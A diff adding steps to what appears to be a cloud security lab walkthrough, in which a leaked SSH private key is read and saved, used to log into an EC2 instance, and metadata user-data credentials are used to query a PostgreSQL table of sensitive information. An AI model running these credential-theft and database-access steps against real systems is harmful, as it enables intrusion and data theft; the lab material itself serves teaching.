@@ -1621,6 +1621,22 @@ cat /home/ubuntu/.ssh/id_rsa
   <img src="/images/cloud/cat_rsa_key.png">
 </p>
 
+* Save the SSH Keys into a file in the local machine.
+
+<p align="center">
+  <img src="/images/cloud/cat_geekfreak.png">
+</p>
+
+* Change the permission of the key.
+
+```bash
+chmod 600 <filename>
+```
+
+<p align="center">
+  <img src="/images/cloud/chmod_geekfreak.png">
+</p>
+
 * Add the new public key to the **authorized_keys** file on the EC2 instance.
 
 ```bash
@@ -1641,6 +1657,16 @@ curl ifconfig.me
   <img src="/images/cloud/curl_ifconfig.png">
 </p>
 
+* SSH into the EC2 Instance using the following command.
+
+```bash
+ssh -i ./<filename> ubuntu@ipaddress
+```
+
+<p align="center">
+  <img src="/images/cloud/ssh_geekfreak.png">
+</p>
+
 * Check for user data specified during the creation of the EC2 instance.
 
 ```bash
@@ -1649,4 +1675,15 @@ curl http://169.254.169.254/latest/user-data
 
 <p align="center">
   <img src="/images/cloud/user_data.png">
+</p>
+
+* Using the leaked data, try to access the psql and retrive the data as shown below.
+
+```bash
+psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>
+select * from sensitive_information;
+```
+
+<p align="center">
+  <img src="/images/cloud/lara_secret.png">
 </p>
